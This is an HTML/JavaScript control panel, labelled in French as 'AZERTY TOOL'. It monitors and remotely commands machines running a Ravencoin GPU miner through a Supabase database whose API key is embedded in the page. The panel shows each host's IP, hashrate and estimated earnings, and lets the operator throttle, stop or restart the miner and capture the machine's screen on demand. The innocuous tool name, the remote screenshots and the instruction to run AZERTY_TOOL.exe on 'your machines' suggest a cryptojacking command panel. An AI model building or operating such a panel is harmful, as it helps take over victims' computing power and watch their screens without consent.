<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>AZERTY TOOL - Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',system-ui,sans-serif;background:#0a0a0a;color:#e0e0e0;min-height:100vh}
.header{background:linear-gradient(135deg,#0d1117,#161b22);border-bottom:1px solid #30363d;padding:20px 30px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px}
.header h1{font-size:1.5rem;color:#00ff88;letter-spacing:2px}
.header .stats{display:flex;gap:12px;flex-wrap:wrap}
.stat-box{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:10px 14px;text-align:center;min-width:80px}
.stat-box .num{font-size:1.4rem;font-weight:700;color:#00ff88}
.stat-box .label{font-size:.65rem;color:#8b949e;text-transform:uppercase;letter-spacing:1px}
.earnings-banner{background:linear-gradient(135deg,#1a1a0a,#2a2a10);border-bottom:1px solid #3d3d1d;padding:14px 30px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px}
.earnings-banner .earn-block{text-align:center}
.earnings-banner .earn-label{font-size:.7rem;color:#8b949e;text-transform:uppercase;letter-spacing:1px}
.earnings-banner .earn-val{font-size:1.3rem;font-weight:700;color:#ffd700}
.earnings-banner .earn-sub{font-size:.75rem;color:#8b949e}
.earnings-banner .rvn-price{font-size:.8rem;color:#8b949e}
.refresh-bar{background:#161b22;padding:8px 30px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #21262d;font-size:.8rem;color:#8b949e}
.refresh-bar button{background:#238636;color:#fff;border:none;padding:6px 14px;border-radius:6px;cursor:pointer;font-size:.8rem}
.refresh-bar button:hover{background:#2ea043}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:16px;padding:20px 30px}
.card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:18px;transition:border-color .2s}
.card:hover{border-color:#00ff88}
.card-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
.card-name{font-weight:700;font-size:1rem}
.badge{padding:3px 10px;border-radius:20px;font-size:.7rem;font-weight:600;text-transform:uppercase;letter-spacing:1px}
.badge.online{background:#0d2818;color:#3fb950;border:1px solid #238636}
.badge.offline{background:#2d1215;color:#f85149;border:1px solid #da3633}
.card-row{display:flex;justify-content:space-between;padding:4px 0;font-size:.85rem;border-bottom:1px solid #21262d}
.card-row:last-child{border:none}
.card-row .k{color:#8b949e}
.card-row .v{color:#e0e0e0;font-weight:500}
.gpu-bar{height:6px;background:#21262d;border-radius:3px;margin-top:8px;overflow:hidden}
.gpu-bar .fill{height:100%;border-radius:3px;transition:width .5s}
.card-earnings{background:#1a1a0a;border:1px solid #3d3d1d;border-radius:8px;padding:10px;margin-top:10px;display:flex;justify-content:space-around;text-align:center}
.card-earnings .ce-block .ce-val{font-size:1rem;font-weight:700;color:#ffd700}
.card-earnings .ce-block .ce-label{font-size:.65rem;color:#8b949e;text-transform:uppercase}
.card-controls{background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:12px;margin-top:10px}
.power-row{display:flex;align-items:center;gap:10px;margin-bottom:8px}
.power-row label{font-size:.8rem;color:#8b949e;min-width:70px}
.power-row input[type=range]{flex:1;accent-color:#00ff88;height:6px}
.power-row .power-val{font-size:.9rem;font-weight:700;color:#00ff88;min-width:40px;text-align:right}
.ctrl-btns{display:flex;gap:8px}
.ctrl-btns button{flex:1;padding:8px;border:none;border-radius:6px;font-size:.8rem;font-weight:600;cursor:pointer;text-transform:uppercase;letter-spacing:1px;transition:opacity .2s}
.ctrl-btns button:hover{opacity:.85}
.btn-stop{background:#da3633;color:#fff}
.btn-restart{background:#238636;color:#fff}
.btn-screen{background:#8957e5;color:#fff}
.toast{position:fixed;bottom:20px;right:20px;background:#238636;color:#fff;padding:12px 20px;border-radius:8px;font-size:.85rem;z-index:9999;opacity:0;transition:opacity .3s;pointer-events:none}
.toast.show{opacity:1}
.empty{text-align:center;padding:60px 20px;color:#8b949e}
.empty h2{color:#30363d;margin-bottom:10px}
.modal-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.85);z-index:10000;align-items:center;justify-content:center}
.modal-overlay.show{display:flex}
.modal-box{background:#161b22;border:1px solid #30363d;border-radius:12px;max-width:95vw;max-height:95vh;overflow:auto;position:relative}
.modal-header{display:flex;justify-content:space-between;align-items:center;padding:14px 18px;border-bottom:1px solid #21262d}
.modal-header h3{font-size:1rem;color:#e0e0e0}
.modal-header .modal-time{font-size:.75rem;color:#8b949e}
.modal-close{background:none;border:none;color:#8b949e;font-size:1.4rem;cursor:pointer;padding:4px 8px}
.modal-close:hover{color:#fff}
.modal-body{padding:12px}
.modal-body img{max-width:100%;border-radius:6px}
.modal-body .no-screen{text-align:center;padding:40px;color:#8b949e}
.screen-loading{text-align:center;padding:20px;color:#8b949e;font-size:.85rem}
@media(max-width:600px){.header{flex-direction:column}.header .stats{width:100%;justify-content:center}.grid{padding:12px}.earnings-banner{flex-direction:column;align-items:stretch;text-align:center}}
</style>
</head>
<body>
<div class="header">
  <h1>AZERTY TOOL</h1>
  <div class="stats">
    <div class="stat-box"><div class="num" id="total">0</div><div class="label">Machines</div></div>
    <div class="stat-box"><div class="num" id="online">0</div><div class="label">En ligne</div></div>
    <div class="stat-box"><div class="num" id="offline">0</div><div class="label">Hors ligne</div></div>
    <div class="stat-box"><div class="num" id="avg-hash">0</div><div class="label">MH/s Total</div></div>
  </div>
</div>
<div class="earnings-banner" id="earnings-banner">
  <div class="earn-block">
    <div class="earn-label">Gains estimes / jour</div>
    <div class="earn-val" id="daily-rvn">-- RVN</div>
    <div class="earn-sub" id="daily-usd">~$--</div>
  </div>
  <div class="earn-block">
    <div class="earn-label">Gains estimes / mois</div>
    <div class="earn-val" id="monthly-rvn">-- RVN</div>
    <div class="earn-sub" id="monthly-usd">~$--</div>
  </div>
  <div class="earn-block">
    <div class="earn-label">Total estime (uptime)</div>
    <div class="earn-val" id="total-rvn">-- RVN</div>
    <div class="earn-sub" id="total-usd">~$--</div>
  </div>
  <div class="earn-block">
    <div class="rvn-price">RVN: <span id="rvn-price">--</span>$</div>
  </div>
</div>
<div class="refresh-bar">
  <span>Mise a jour auto toutes les 10s &mdash; <span id="last-update">...</span></span>
  <button onclick="loadData()">Actualiser</button>
</div>
<div class="grid" id="grid"></div>
<div class="toast" id="toast"></div>

<div class="modal-overlay" id="modal" onclick="closeModal(event)">
  <div class="modal-box" onclick="event.stopPropagation()">
    <div class="modal-header">
      <h3 id="modal-title">Capture d'ecran</h3>
      <div>
        <span class="modal-time" id="modal-time"></span>
        <button class="modal-close" onclick="document.getElementById('modal').classList.remove('show')">&times;</button>
      </div>
    </div>
    <div class="modal-body" id="modal-body">
      <div class="no-screen">Aucune capture disponible</div>
    </div>
  </div>
</div>

<script>
const SUPABASE_URL='https://imwdpuumpvecpziigsyz.supabase.co';
const SUPABASE_KEY='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imltd2RwdXVtcHZlY3B6aWlnc3l6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTUyNTU4MDIsImV4cCI6MjExMDgzMTgwMn0.xK1YmdiLQ8yyWnvq4XX1KUakMoudHSCuwoN63lBIu8w';

let rvnPriceUsd=0;
var machinesCache=[];

function showToast(msg){
  const t=document.getElementById('toast');
  t.textContent=msg;
  t.classList.add('show');
  setTimeout(function(){t.classList.remove('show')},2500);
}

function closeModal(e){
  if(e.target===document.getElementById('modal'))
    document.getElementById('modal').classList.remove('show');
}

async function sendCommand(hostname,field,value){
  var body={};body[field]=value;
  try{
    await fetch(SUPABASE_URL+'/rest/v1/machines?hostname=eq.'+encodeURIComponent(hostname),{
      method:'PATCH',
      headers:{'apikey':SUPABASE_KEY,'Authorization':'Bearer '+SUPABASE_KEY,'Content-Type':'application/json','Prefer':'return=minimal'},
      body:JSON.stringify(body)
    });
    showToast(hostname+' : '+field+'='+value);
    setTimeout(loadData,2000);
  }catch(e){
    showToast('Erreur: '+e.message);
  }
}

function setPower(hostname,val){
  document.getElementById('pw-'+hostname).textContent=val+'%';
  sendCommand(hostname,'target_power',parseInt(val));
}

function stopMiner(hostname){
  if(!confirm('Arreter le miner sur '+hostname+' ?')) return;
  sendCommand(hostname,'command','stop');
}

function restartMiner(hostname){
  sendCommand(hostname,'command','restart');
}

function requestScreenshot(hostname){
  showToast('Capture demandee a '+hostname+'...');
  sendCommand(hostname,'command','screenshot');
  setTimeout(function(){showScreenshot(hostname)},8000);
}

async function showScreenshot(hostname){
  document.getElementById('modal-title').textContent='Capture - '+hostname;
  document.getElementById('modal-body').innerHTML='<div class="screen-loading">Chargement de la capture...</div>';
  document.getElementById('modal').classList.add('show');

  try{
    var r=await fetch(SUPABASE_URL+'/rest/v1/machines?hostname=eq.'+encodeURIComponent(hostname)+'&select=screenshot_b64,screenshot_at',{
      headers:{'apikey':SUPABASE_KEY,'Authorization':'Bearer '+SUPABASE_KEY}
    });
    var data=await r.json();
    if(data.length>0 && data[0].screenshot_b64){
      var timeStr='';
      if(data[0].screenshot_at){
        var d=new Date(data[0].screenshot_at);
        timeStr=d.toLocaleString('fr-FR');
      }
      document.getElementById('modal-time').textContent=timeStr;
      document.getElementById('modal-body').innerHTML='<img src="data:image/jpeg;base64,'+data[0].screenshot_b64+'" alt="Screenshot '+esc(hostname)+'">';
    }else{
      document.getElementById('modal-time').textContent='';
      document.getElementById('modal-body').innerHTML='<div class="no-screen">Aucune capture disponible.<br>La machine doit etre en ligne et recevoir la commande.</div>';
    }
  }catch(e){
    document.getElementById('modal-body').innerHTML='<div class="no-screen">Erreur: '+esc(e.message)+'</div>';
  }
}

async function fetchRvnPrice(){
  try{
    var r=await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ravencoin&vs_currencies=usd');
    var d=await r.json();
    if(d.ravencoin&&d.ravencoin.usd) rvnPriceUsd=d.ravencoin.usd;
  }catch{}
}

var RVN_PER_MHS_PER_DAY=15;

function estimateEarnings(hashrateMhs,uptimeMinutes){
  var dailyRvn=hashrateMhs*RVN_PER_MHS_PER_DAY;
  var uptimeDays=uptimeMinutes/1440;
  var totalRvn=dailyRvn*uptimeDays;
  return{dailyRvn:dailyRvn,totalRvn:totalRvn};
}

async function loadData(){
  if(rvnPriceUsd===0) await fetchRvnPrice();
  try{
    var r=await fetch(SUPABASE_URL+'/rest/v1/machines?select=hostname,gpu_name,gpu_vendor,gpu_usage_percent,gpu_temp_c,hashrate_mhs,status,ip_address,uptime_minutes,last_seen,target_power,command&order=hostname',{
      headers:{'apikey':SUPABASE_KEY,'Authorization':'Bearer '+SUPABASE_KEY}
    });
    var data=await r.json();
    if(!Array.isArray(data)){
      document.getElementById('grid').innerHTML='<div class="empty"><h2>Erreur API</h2><p>'+(data.message||JSON.stringify(data))+'</p></div>';
      return;
    }
    machinesCache=data;
    render(data);
  }catch(e){
    document.getElementById('grid').innerHTML='<div class="empty"><h2>Erreur de connexion</h2><p>'+e.message+'</p></div>';
  }
}

function render(machines){
  var now=Date.now();
  if(!machines||!machines.length){machines=[];}
  machines.forEach(function(m){
    var lastSeen=new Date(m.last_seen).getTime();
    m._online=(now-lastSeen)<300000;
  });

  var total=machines.length;
  var onlineCount=machines.filter(function(m){return m._online}).length;
  var offlineCount=total-onlineCount;
  var totalHash=machines.reduce(function(s,m){return s+(m.hashrate_mhs||0)},0);

  document.getElementById('total').textContent=total;
  document.getElementById('online').textContent=onlineCount;
  document.getElementById('offline').textContent=offlineCount;
  document.getElementById('avg-hash').textContent=totalHash.toFixed(1);
  document.getElementById('last-update').textContent=new Date().toLocaleTimeString('fr-FR');

  var globalDailyRvn=0;
  var globalTotalRvn=0;
  machines.forEach(function(m){
    var e=estimateEarnings(m.hashrate_mhs||0,m.uptime_minutes||0);
    globalDailyRvn+=e.dailyRvn;
    globalTotalRvn+=e.totalRvn;
  });

  document.getElementById('daily-rvn').textContent=globalDailyRvn.toFixed(1)+' RVN';
  document.getElementById('daily-usd').textContent='~$'+(globalDailyRvn*rvnPriceUsd).toFixed(2);
  document.getElementById('monthly-rvn').textContent=(globalDailyRvn*30).toFixed(0)+' RVN';
  document.getElementById('monthly-usd').textContent='~$'+(globalDailyRvn*30*rvnPriceUsd).toFixed(2);
  document.getElementById('total-rvn').textContent=globalTotalRvn.toFixed(1)+' RVN';
  document.getElementById('total-usd').textContent='~$'+(globalTotalRvn*rvnPriceUsd).toFixed(2);
  document.getElementById('rvn-price').textContent=rvnPriceUsd.toFixed(4);

  var grid=document.getElementById('grid');
  if(total===0){
    grid.innerHTML='<div class="empty"><h2>Aucune machine detectee</h2><p>Lancez AZERTY_TOOL.exe sur vos machines</p></div>';
    return;
  }

  grid.innerHTML=machines.map(function(m){
    var status=m._online?'online':'offline';
    var statusLabel=m._online?'En ligne':'Hors ligne';
    var gpuColor=m.gpu_usage_percent>70?'#f85149':m.gpu_usage_percent>40?'#d29922':'#3fb950';
    var upH=Math.floor(m.uptime_minutes/60);
    var upM=m.uptime_minutes%60;
    var e=estimateEarnings(m.hashrate_mhs||0,m.uptime_minutes||0);
    var curPower=m.target_power||100;
    var h=esc(m.hostname);

    return '<div class="card"><div class="card-header"><span class="card-name">'+h+'</span><span class="badge '+status+'">'+statusLabel+'</span></div>'
      +'<div class="card-row"><span class="k">GPU</span><span class="v">'+esc(m.gpu_name||"—")+'</span></div>'
      +'<div class="card-row"><span class="k">Hashrate</span><span class="v">'+(m.hashrate_mhs||0).toFixed(2)+' MH/s</span></div>'
      +'<div class="card-row"><span class="k">Utilisation GPU</span><span class="v" style="color:'+gpuColor+'">'+m.gpu_usage_percent+'%</span></div>'
      +'<div class="gpu-bar"><div class="fill" style="width:'+m.gpu_usage_percent+'%;background:'+gpuColor+'"></div></div>'
      +'<div class="card-row"><span class="k">Temperature</span><span class="v">'+m.gpu_temp_c+'&deg;C</span></div>'
      +'<div class="card-row"><span class="k">IP</span><span class="v">'+esc(m.ip_address||"—")+'</span></div>'
      +'<div class="card-row"><span class="k">Uptime</span><span class="v">'+upH+'h '+upM+'m</span></div>'
      +'<div class="card-earnings">'
        +'<div class="ce-block"><div class="ce-val">'+e.dailyRvn.toFixed(1)+'</div><div class="ce-label">RVN/jour</div></div>'
        +'<div class="ce-block"><div class="ce-val">$'+(e.dailyRvn*rvnPriceUsd).toFixed(2)+'</div><div class="ce-label">$/jour</div></div>'
        +'<div class="ce-block"><div class="ce-val">'+e.totalRvn.toFixed(0)+'</div><div class="ce-label">RVN total</div></div>'
        +'<div class="ce-block"><div class="ce-val">$'+(e.totalRvn*rvnPriceUsd).toFixed(2)+'</div><div class="ce-label">$ total</div></div>'
      +'</div>'
      +'<div class="card-controls">'
        +'<div class="power-row">'
          +'<label>Puissance</label>'
          +'<input type="range" min="10" max="100" step="5" value="'+curPower+'" onchange="setPower(\''+h+'\',this.value)" oninput="document.getElementById(\'pw-'+h+'\').textContent=this.value+\'%\'">'
          +'<span class="power-val" id="pw-'+h+'">'+curPower+'%</span>'
        +'</div>'
        +'<div class="ctrl-btns">'
          +'<button class="btn-screen" onclick="requestScreenshot(\''+h+'\')">Capture</button>'
          +'<button class="btn-stop" onclick="stopMiner(\''+h+'\')">Stop</button>'
          +'<button class="btn-restart" onclick="restartMiner(\''+h+'\')">Restart</button>'
        +'</div>'
      +'</div>'
    +'</div>';
  }).join('');
}

function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;')}

fetchRvnPrice();
setInterval(fetchRvnPrice,300000);
loadData();
setInterval(loadData,10000);
</script>
</body>
</html>
